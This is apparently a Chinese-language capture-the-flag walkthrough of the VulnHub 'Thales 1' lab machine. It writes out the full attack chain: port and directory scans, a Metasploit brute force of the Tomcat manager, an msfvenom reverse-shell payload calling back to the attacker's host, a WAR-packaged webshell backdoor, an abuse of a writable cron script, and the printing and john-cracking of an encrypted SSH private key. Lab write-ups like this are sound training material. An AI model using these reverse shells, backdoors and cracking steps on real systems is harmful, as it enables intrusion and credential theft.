# 靶机信息

请参考 vulnhub 官网 [Thales 1 题目详情](https://www.vulnhub.com/entry/thales-1,749/)


目标是获取两个 flag: user.txt ，root.txt.


# 端口扫描

扫描 TCP 端口，发现开放 22，8080 端口

```
┌──(kali㉿kali)-[~]
└─$ sudo nmap -sS 192.168.1.6 -sV
Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-24 08:00 EDT
Nmap scan report for 192.168.1.6
Host is up (0.00036s latency).
Not shown: 998 filtered tcp ports (no-response)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
8080/tcp open  http    Apache Tomcat 9.0.52
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 29.60 seconds

```

## 端口分析

### 22端口分析

通过查找POC或者exp，SSH版本存在用户枚举漏洞，但是靶机禁止SSH登录，通过爆破SSH用户密码的方式行不通
```
┌──(kali㉿kali)-[~]
└─$ searchsploit OpenSSH 7.6p1
---------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                              |  Path
---------------------------------------------------------------------------------------------------------------------------- ---------------------------------
OpenSSH 2.3 < 7.7 - Username Enumeration                                                                                    | linux/remote/45233.py
OpenSSH 2.3 < 7.7 - Username Enumeration (PoC)                                                                              | linux/remote/45210.py
OpenSSH < 7.7 - User Enumeration (2)                                                                                        | linux/remote/45939.py
---------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results

```

### 8080端口分析

通过扫描知道，8080端口是 apache tomcat端口，进一步目录扫描，发现都是tomcat的一些目录目录，尝试访问 http://target:8080/manager/html 发现有访问控制

```
┌──(kali㉿kali)-[~]
└─$ dirsearch -u http://192.168.1.6:8080/ -t 16

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 16 | Wordlist size: 10927

Output File: /home/kali/.dirsearch/reports/192.168.1.6-8080/-_23-09-24_08-40-15.txt

Error Log: /home/kali/.dirsearch/logs/errors-23-09-24_08-40-15.log

Target: http://192.168.1.6:8080/

[08:40:15] Starting:
[08:40:22] 400 -  795B  - /\..\..\..\..\..\..\..\..\..\etc\passwd
[08:40:23] 400 -  795B  - /a%5c.aspx
[08:40:34] 302 -    0B  - /docs  ->  /docs/
[08:40:34] 200 -   15KB - /docs/
[08:40:35] 200 -    1KB - /examples/
[08:40:35] 302 -    0B  - /examples  ->  /examples/
[08:40:35] 200 -  674B  - /examples/jsp/snp/snoop.jsp
[08:40:35] 200 -  945B  - /examples/servlets/servlet/RequestHeaderExample
[08:40:35] 200 -    6KB - /examples/servlets/index.html
[08:40:35] 200 -   21KB - /favicon.ico
[08:40:37] 401 -    2KB - /host-manager/html
[08:40:37] 302 -    0B  - /host-manager/  ->  /host-manager/html
[08:40:37] 200 -  658B  - /examples/servlets/servlet/CookieExample
[08:40:37] 200 -   11KB - /index.jsp
[08:40:40] 302 -    0B  - /manager  ->  /manager/
[08:40:40] 401 -    2KB - /manager/html/
[08:40:40] 302 -    0B  - /manager/  ->  /manager/html
[08:40:40] 401 -    2KB - /manager/html
[08:40:40] 401 -    2KB - /manager/jmxproxy/?get=BEANNAME&att=MYATTRIBUTE&key=MYKEY
[08:40:40] 401 -    2KB - /manager/jmxproxy
[08:40:40] 401 -    2KB - /manager/jmxproxy/?get=java.lang:type=Memory&att=HeapMemoryUsage
[08:40:40] 401 -    2KB - /manager/status/all
[08:40:40] 401 -    2KB - /manager/jmxproxy/?get=java.lang:type=Memory&att=HeapMemoryUsage&key=used
[08:40:40] 401 -    2KB - /manager/jmxproxy/?set=Catalina%3Atype%3DValve%2Cname%3DErrorReportValve%2Chost%3Dlocalhost&att=debug&val=cow
[08:40:40] 401 -    2KB - /manager/jmxproxy/?set=BEANNAME&att=MYATTRIBUTE&val=NEWVALUE
[08:40:40] 401 -    2KB - /manager/jmxproxy/?invoke=Catalina%3Atype%3DService&op=findConnectors&ps=
[08:40:40] 401 -    2KB - /manager/jmxproxy/?qry=STUFF
[08:40:40] 401 -    2KB - /manager/jmxproxy/?invoke=BEANNAME&op=METHODNAME&ps=COMMASEPARATEDPARAMETERS
[08:40:47] 302 -    0B  - /shell  ->  /shell/
[08:40:57] 200 -    6B  - /shell/

Task Completed


┌──(kali㉿kali)-[~]
└─$ dirsearch -u http://192.168.1.6:8080/examples -t 16

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 16 | Wordlist size: 10927

Output File: /home/kali/.dirsearch/reports/192.168.1.6-8080/-examples_23-09-24_08-24-57.txt

Error Log: /home/kali/.dirsearch/logs/errors-23-09-24_08-24-57.log

Target: http://192.168.1.6:8080/examples/

[08:24:57] Starting:
[08:24:58] 302 -    0B  - /examples/jsp  ->  /examples/jsp/
[08:24:58] 200 -   11KB - /examples/..;/
[08:25:05] 400 -  795B  - /examples/\..\..\..\..\..\..\..\..\..\etc\passwd
[08:25:06] 400 -  795B  - /examples/a%5c.aspx
[08:25:15] 200 -  255B  - /examples/console/j_security_check
[08:25:20] 200 -    1KB - /examples/index.html
[08:25:21] 200 -  255B  - /examples/j_security_check
[08:25:29] 200 -    6KB - /examples/servlets/


```


使用msfconsole爆破密码，爆破得到  http://target:8080/manager/html 的登录用户及密码是 tomcat/role1

```
msf6 > search tomcat_mgr

Matching Modules
================

   #  Name                                     Disclosure Date  Rank       Check  Description
   -  ----                                     ---------------  ----       -----  -----------
   0  exploit/multi/http/tomcat_mgr_deploy     2009-11-09       excellent  Yes    Apache Tomcat Manager Application Deployer Authenticated Code Execution
   1  exploit/multi/http/tomcat_mgr_upload     2009-11-09       excellent  Yes    Apache Tomcat Manager Authenticated Upload Code Execution
   2  auxiliary/scanner/http/tomcat_mgr_login                   normal     No     Tomcat Application Manager Login Utility


Interact with a module by name or index. For example info 2, use 2 or use auxiliary/scanner/http/tomcat_mgr_login

msf6 > use 2
msf6 auxiliary(scanner/http/tomcat_mgr_login) > set rhost 192.168.56.103
rhost => 192.168.56.103
msf6 auxiliary(scanner/http/tomcat_mgr_login) > set rport 8080
rport => 8080
msf6 auxiliary(scanner/http/tomcat_mgr_login) > exploit

[!] No active DB -- Credential data will not be saved!
[-] 192.168.56.103:8080 - LOGIN FAILED: admin:admin (Incorrect)
[-] 192.168.56.103:8080 - LOGIN FAILED: admin:manager (Incorrect)
[-] 192.168.56.103:8080 - LOGIN FAILED: admin:role1 (Incorrect)
[-] 192.168.56.103:8080 - LOGIN FAILED: admin:root (Incorrect)
[-] 192.168.56.103:8080 - LOGIN FAILED: admin:tomcat (Incorrect)
[-] 192.168.56.103:8080 - LOGIN FAILED: admin:s3cret (Incorrect)
[-] 192.168.56.103:8080 - LOGIN FAILED: admin:vagrant (Incorrect)
[-] 192.168.56.103:8080 - LOGIN FAILED: admin:QLogic66 (Incorrect)
[-] 192.168.56.103:8080 - LOGIN FAILED: admin:password (Incorrect)
[-] 192.168.56.103:8080 - LOGIN FAILED: admin:Password1 (Incorrect)
[-] 192.168.56.103:8080 - LOGIN FAILED: admin:changethis (Incorrect)
[-] 192.168.56.103:8080 - LOGIN FAILED: admin:r00t (Incorrect)
[-] 192.168.56.103:8080 - LOGIN FAILED: admin:toor (Incorrect)
[-] 192.168.56.103:8080 - LOGIN FAILED: admin:password1 (Incorrect)
[-] 192.168.56.103:8080 - LOGIN FAILED: admin:j2deployer (Incorrect)
[-] 192.168.56.103:8080 - LOGIN FAILED: admin:OvW*busr1 (Incorrect)
[-] 192.168.56.103:8080 - LOGIN FAILED: admin:kdsxc (Incorrect)
[-] 192.168.56.103:8080 - LOGIN FAILED: admin:owaspba (Incorrect)
[-] 192.168.56.103:8080 - LOGIN FAILED: admin:ADMIN (Incorrect)
[-] 192.168.56.103:8080 - LOGIN FAILED: admin:xampp (Incorrect)
[-] 192.168.56.103:8080 - LOGIN FAILED: manager:admin (Incorrect)
[-] 192.168.56.103:8080 - LOGIN FAILED: manager:manager (Incorrect)
[-] 192.168.56.103:8080 - LOGIN FAILED: manager:role1 (Incorrect)
[-] 192.168.56.103:8080 - LOGIN FAILED: manager:root (Incorrect)
[-] 192.168.56.103:8080 - LOGIN FAILED: manager:tomcat (Incorrect)
[-] 192.168.56.103:8080 - LOGIN FAILED: manager:s3cret (Incorrect)
[-] 192.168.56.103:8080 - LOGIN FAILED: manager:vagrant (Incorrect)
[-] 192.168.56.103:8080 - LOGIN FAILED: manager:QLogic66 (Incorrect)
[-] 192.168.56.103:8080 - LOGIN FAILED: manager:password (Incorrect)
[-] 192.168.56.103:8080 - LOGIN FAILED: manager:Password1 (Incorrect)
[-] 192.168.56.103:8080 - LOGIN FAILED: manager:changethis (Incorrect)
[-] 192.168.56.103:8080 - LOGIN FAILED: manager:r00t (Incorrect)
[-] 192.168.56.103:8080 - LOGIN FAILED: manager:toor (Incorrect)
[-] 192.168.56.103:8080 - LOGIN FAILED: manager:password1 (Incorrect)
[-] 192.168.56.103:8080 - LOGIN FAILED: manager:j2deployer (Incorrect)
[-] 192.168.56.103:8080 - LOGIN FAILED: manager:OvW*busr1 (Incorrect)
[-] 192.168.56.103:8080 - LOGIN FAILED: manager:kdsxc (Incorrect)
[-] 192.168.56.103:8080 - LOGIN FAILED: manager:owaspba (Incorrect)
[-] 192.168.56.103:8080 - LOGIN FAILED: manager:ADMIN (Incorrect)
[-] 192.168.56.103:8080 - LOGIN FAILED: manager:xampp (Incorrect)
[-] 192.168.56.103:8080 - LOGIN FAILED: role1:admin (Incorrect)
[-] 192.168.56.103:8080 - LOGIN FAILED: role1:manager (Incorrect)
[-] 192.168.56.103:8080 - LOGIN FAILED: role1:role1 (Incorrect)
[-] 192.168.56.103:8080 - LOGIN FAILED: role1:root (Incorrect)
[-] 192.168.56.103:8080 - LOGIN FAILED: role1:tomcat (Incorrect)
[-] 192.168.56.103:8080 - LOGIN FAILED: role1:s3cret (Incorrect)
[-] 192.168.56.103:8080 - LOGIN FAILED: role1:vagrant (Incorrect)
[-] 192.168.56.103:8080 - LOGIN FAILED: role1:QLogic66 (Incorrect)
[-] 192.168.56.103:8080 - LOGIN FAILED: role1:password (Incorrect)
[-] 192.168.56.103:8080 - LOGIN FAILED: role1:Password1 (Incorrect)
[-] 192.168.56.103:8080 - LOGIN FAILED: role1:changethis (Incorrect)
[-] 192.168.56.103:8080 - LOGIN FAILED: role1:r00t (Incorrect)
[-] 192.168.56.103:8080 - LOGIN FAILED: role1:toor (Incorrect)
[-] 192.168.56.103:8080 - LOGIN FAILED: role1:password1 (Incorrect)
[-] 192.168.56.103:8080 - LOGIN FAILED: role1:j2deployer (Incorrect)
[-] 192.168.56.103:8080 - LOGIN FAILED: role1:OvW*busr1 (Incorrect)
[-] 192.168.56.103:8080 - LOGIN FAILED: role1:kdsxc (Incorrect)
[-] 192.168.56.103:8080 - LOGIN FAILED: role1:owaspba (Incorrect)
[-] 192.168.56.103:8080 - LOGIN FAILED: role1:ADMIN (Incorrect)
[-] 192.168.56.103:8080 - LOGIN FAILED: role1:xampp (Incorrect)
[-] 192.168.56.103:8080 - LOGIN FAILED: role:admin (Incorrect)
[-] 192.168.56.103:8080 - LOGIN FAILED: role:manager (Incorrect)
[-] 192.168.56.103:8080 - LOGIN FAILED: role:role1 (Incorrect)
[-] 192.168.56.103:8080 - LOGIN FAILED: role:root (Incorrect)
[-] 192.168.56.103:8080 - LOGIN FAILED: role:tomcat (Incorrect)
[-] 192.168.56.103:8080 - LOGIN FAILED: role:s3cret (Incorrect)
[-] 192.168.56.103:8080 - LOGIN FAILED: role:vagrant (Incorrect)
[-] 192.168.56.103:8080 - LOGIN FAILED: role:QLogic66 (Incorrect)
[-] 192.168.56.103:8080 - LOGIN FAILED: role:password (Incorrect)
[-] 192.168.56.103:8080 - LOGIN FAILED: role:Password1 (Incorrect)
[-] 192.168.56.103:8080 - LOGIN FAILED: role:changethis (Incorrect)
[-] 192.168.56.103:8080 - LOGIN FAILED: role:r00t (Incorrect)
[-] 192.168.56.103:8080 - LOGIN FAILED: role:toor (Incorrect)
[-] 192.168.56.103:8080 - LOGIN FAILED: role:password1 (Incorrect)
[-] 192.168.56.103:8080 - LOGIN FAILED: role:j2deployer (Incorrect)
[-] 192.168.56.103:8080 - LOGIN FAILED: role:OvW*busr1 (Incorrect)
[-] 192.168.56.103:8080 - LOGIN FAILED: role:kdsxc (Incorrect)
[-] 192.168.56.103:8080 - LOGIN FAILED: role:owaspba (Incorrect)
[-] 192.168.56.103:8080 - LOGIN FAILED: role:ADMIN (Incorrect)
[-] 192.168.56.103:8080 - LOGIN FAILED: role:xampp (Incorrect)
[-] 192.168.56.103:8080 - LOGIN FAILED: root:admin (Incorrect)
[-] 192.168.56.103:8080 - LOGIN FAILED: root:manager (Incorrect)
[-] 192.168.56.103:8080 - LOGIN FAILED: root:role1 (Incorrect)
[-] 192.168.56.103:8080 - LOGIN FAILED: root:root (Incorrect)
[-] 192.168.56.103:8080 - LOGIN FAILED: root:tomcat (Incorrect)
[-] 192.168.56.103:8080 - LOGIN FAILED: root:s3cret (Incorrect)
[-] 192.168.56.103:8080 - LOGIN FAILED: root:vagrant (Incorrect)
[-] 192.168.56.103:8080 - LOGIN FAILED: root:QLogic66 (Incorrect)
[-] 192.168.56.103:8080 - LOGIN FAILED: root:password (Incorrect)
[-] 192.168.56.103:8080 - LOGIN FAILED: root:Password1 (Incorrect)
[-] 192.168.56.103:8080 - LOGIN FAILED: root:changethis (Incorrect)
[-] 192.168.56.103:8080 - LOGIN FAILED: root:r00t (Incorrect)
[-] 192.168.56.103:8080 - LOGIN FAILED: root:toor (Incorrect)
[-] 192.168.56.103:8080 - LOGIN FAILED: root:password1 (Incorrect)
[-] 192.168.56.103:8080 - LOGIN FAILED: root:j2deployer (Incorrect)
[-] 192.168.56.103:8080 - LOGIN FAILED: root:OvW*busr1 (Incorrect)
[-] 192.168.56.103:8080 - LOGIN FAILED: root:kdsxc (Incorrect)
[-] 192.168.56.103:8080 - LOGIN FAILED: root:owaspba (Incorrect)
[-] 192.168.56.103:8080 - LOGIN FAILED: root:ADMIN (Incorrect)
[-] 192.168.56.103:8080 - LOGIN FAILED: root:xampp (Incorrect)
[-] 192.168.56.103:8080 - LOGIN FAILED: tomcat:admin (Incorrect)
[-] 192.168.56.103:8080 - LOGIN FAILED: tomcat:manager (Incorrect)
[+] 192.168.56.103:8080 - Login Successful: tomcat:role1
[-] 192.168.56.103:8080 - LOGIN FAILED: both:admin (Incorrect)
[-] 192.168.56.103:8080 - LOGIN FAILED: both:manager (Incorrect)

```


# 上传后门

使用 `msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.56.101 LPORT=2233 -f elf > reverseshell` 生产反向 shell 可执行文件

通过 tomcat:role1 用户密码登录 http://target:8080/manager/html 上传后门， 将 webshell.jsp，reverseshell 文件先打包成 zip 文件，如 backdoor.zip，将 backdoor.zip 重命名为 backdoor.war 并上传，然后点击部署，部署成功后，可以通过 http://target:8080/backdoor/webshell.jsp 访问自己上传的后门文件，通过 webshell 执行 reverseshell

![Alt text](<./images/thales 1靶机wp/image.png>)

# 获取flag

解法1：

通过 webshell.jsp 执行 revershell 反向 shell 后门，通过 find 命令可以知道 user.txt 文件位于 /home/thales 目录下，

```
tomcat@miletus:/$ ls -al /home/thales
ls -al /home/thales
total 52
drwxr-xr-x 6 thales thales 4096 Oct 14  2021 .
drwxr-xr-x 3 root   root   4096 Aug 15  2021 ..
-rw------- 1 thales thales  496 Oct  6 01:06 .bash_history
-rw-r--r-- 1 thales thales  220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 thales thales 3771 Apr  4  2018 .bashrc
drwx------ 2 thales thales 4096 Aug 15  2021 .cache
drwx------ 3 thales thales 4096 Aug 15  2021 .gnupg
drwxrwxr-x 3 thales thales 4096 Aug 15  2021 .local
-rw-r--r-- 1 thales thales  807 Apr  4  2018 .profile
-rw-r--r-- 1 root   root     66 Aug 15  2021 .selected_editor
drwxrwxrwx 2 thales thales 4096 Aug 16  2021 .ssh
-rw-r--r-- 1 thales thales    0 Oct 14  2021 .sudo_as_admin_successful
-rw-r--r-- 1 root   root    107 Oct 14  2021 notes.txt
-rw------- 1 thales thales   33 Aug 15  2021 user.txt
```

tomcat 用户无权限查看 user.txt, 查看 notes.txt 可以看到提示

```
tomcat@miletus:/$ cat /home/thales/notes.txt
cat /home/thales/notes.txt
I prepared a backup script for you. The script is in this directory "/usr/local/bin/backup.sh". Good Luck.
```

/usr/local/bin/backup.sh 为定时任务脚本，同时该脚本可读可写，写入任意命令获取到 root 权限


解法2：

查看 .ssh 目录发现有私钥，通过爆破私钥加密密码，通过密钥登录可以获取 thales 权限的 shell，注：这里作者将 ssh 私钥的加密口令和登录口令设置成一样了

```
tomcat@miletus:/$ ls -al /home/thales/.ssh
ls -al /home/thales/.ssh
total 16
drwxrwxrwx 2 thales thales 4096 Aug 16  2021 .
drwxr-xr-x 6 thales thales 4096 Oct 14  2021 ..
-rw-r--r-- 1 thales thales 1766 Aug 16  2021 id_rsa
-rw-r--r-- 1 thales thales  396 Aug 16  2021 id_rsa.pub
tomcat@miletus:/$ cat /home/thales/.ssh/id_rsa
cat /home/thales/.ssh/id_rsa
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,6103FE9ABCD5EF41F96C07F531922AAF

ZMlKhm2S2Cqbj+k3h8MgQFr6oG4CBKqF1NfT04fJPs1xbXe00aSdS+QgIbSaKWMh
+/ILeS/r8rFUt9isW2QAH7JYEWBgR4Z/9KSMSUd1aEyjxz7FpZj2cL1Erj9wK9ZA
InMmkm7xAKOWKwLTJeMS3GB4X9AX9ef/Ijmxx/cvvIauK5G2jPRyGSazMjK0QcwX
pkwnm4EwXPDiktkwzg15RwIhJdZBbrMj7WW9kt0CF9P754mChdIWzHrxYhCUIfWd
rHbDYTKmfL18LYhHaj9ZklkZjb8li8JIPvnJDcnLsCY+6X1xB9dqbUGGtSHNnHiL
rmrOSfI7RYt9gCgMtFimYRaS7gFuvZE/NmmIUJkH3Ccv1mIj3wT1TCtvREv+eKgf
/nj+3A6ZSQKFdlm22YZBilE4npxGOC03s81Rbvg90cxOhxYGTZMu/jU9ebUT2HAh
o1B972ZAWj3m5sDZRiQ+wTGqwFBFxF9EPia6sRM/tBKaigIElDSyvz1C46mLTmBS
f8KNwx5rNXkNM7dYX1Sykg0RreKO1weYAA0yQSHCY+iJTIf81CuDcgOIYRywHIPU
9rI20K910cLLo+ySa7O4KDcmIL1WCnGbrD4PwupQ68G2YG0ZOOIrwE9efkpwXPCR
Vi2TO2Zut8x6ZEFjz4d3aWIzWtf1IugQrsmBK+akRLBPjQVy/LyApqvV+tYfQelV
v9pEKMxR5f1gFmZpTbZ6HDHmEO4Y7gXvUXphjW5uijYemcyGx0HSqCSER7y7+phA
h0NEJHSBSdMpvoS7oSIxC0qe4QsSwITYtJs5fKuvJejRGpoh1O2HE+etITXlFffm
2J1fdQgPo+qbOVSMGmkITfTBDh1ODG7TZYAq8OLyEh/yiALoZ8T1AEeAJev5hON5
PUUP8cxX4SH43lnsmIDjn8M+nEsMEWVZzvaqo6a2Sfa/SEdxq8ZIM1Nm8fLuS8N2
GCrvRmCd7H+KrMIY2Y4QuTFR1etulbBPbmcCmpsXlj496bE7n5WwILLw3Oe4IbZm
ztB5WYAww6yyheLmgU4WkKMx2sOWDWZ/TSEP0j9esOeh2mOt/7Grrhn3xr8zqnCY
i4utbnsjL4U7QVaa+zWz6PNiShH/LEpuRu2lJWZU8mZ7OyUyx9zoPRWEmz/mhOAb
jRMSyfLNFggfzjswgcbwubUrpX2Gn6XMb+MbTY3CRXYqLaGStxUtcpMdpj4QrFLP
eP/3PGXugeJi8anYMxIMc3cJR03EktX5Cj1TQRCjPWGoatOMh02akMHvVrRKGG1d
/sMTTIDrlYlrEAfQXacjQF0gzqxy7jQaUc0k4Vq5iWggjXNV2zbR/YYFwUzgSjSe
SNZzz4AMwRtlCWxrdoD/exvCeKWuObPlajTI3MaUoxPjOvhQK55XWIcg+ogo9X5x
B8XDQ3qW6QJLFELXpAnl5zW5cAHXAVzCp+VtgQyrPU04gkoOrlrj5u22UU8giTdq
nLypW+J5rGepKGrklOP7dxEBbQiy5XDm/K/22r9y+Lwyl38LDF2va22szGoW/oT+
8eZHEOYASwoSKng9UEhNvX/JpsGig5sAamBgG1sV9phyR2Y9MNb/698hHyULD78C
-----END RSA PRIVATE KEY-----
tomcat@miletus:/$
```

使用 kali 的 

```
┌──(kali㉿kali)-[~]
└─$ ssh2john id_rsa > passwd.txt


┌──(kali㉿kali)-[~]
└─$ sudo john --wordlist=/usr/share/wordlists/rockyou.txt passwd.txt
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
vodka06          (sshkey)
1g 0:00:00:00 DONE (2023-10-06 05:55) 2.941g/s 8411Kp/s 8411Kc/s 8411KC/s vodka411..vodka*rox
Use the "--show" option to display all of the cracked passwords reliably
Session completed.

```

爆破获取到口令为 vodka06，靶机上 tomcat 权限的 shell 执行 su thales 命令再输入口令即可获取 thales 权限的 shell